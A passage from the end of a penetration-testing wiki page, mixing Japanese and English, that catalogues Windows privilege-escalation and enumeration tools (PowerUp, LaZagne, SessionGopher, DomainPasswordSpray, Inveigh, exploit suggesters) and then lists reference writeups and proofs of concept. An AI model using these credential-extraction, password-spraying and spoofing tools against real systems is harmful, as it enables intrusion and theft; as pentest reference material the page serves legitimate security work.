[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を Check（**[**こちらを check**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの possible misconfigurations を Check し、info を gather（**[**こちらを check**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を Check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、および RDP の saved session information を extract します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を Extract します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gathered passwords を domain 全体に Spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- known privesc vulnerabilities を Search（Watson により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- known privesc vulnerabilities を Search（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を Enumerate（privesc tool というより gather info tool）（compile が必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の softwares から credentials を Extract（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# への Port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を Check（github に executable precompiled あり）。Not recommended。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- possible misconfigurations を Check（python からの exe）。Not recommended。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を based に作成された tool（正常に動作させるために accesschk への access は不要ですが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を recommend（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を recommend（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

project は、正しい version の .NET を使用して compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host に installed されている .NET の version を確認するには、次のように実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [1] [Windows Privilege Escalation の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows Privilege Escalation Methods for Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Chaining CLDFLT and DirectX Kernel Race Conditions for Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusing Arbitrary File Deletes to Escalate Privilege and Other Great Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, a Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Exploring Credential Manager and Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)

{{#include ../../banners/hacktricks-training.md}}
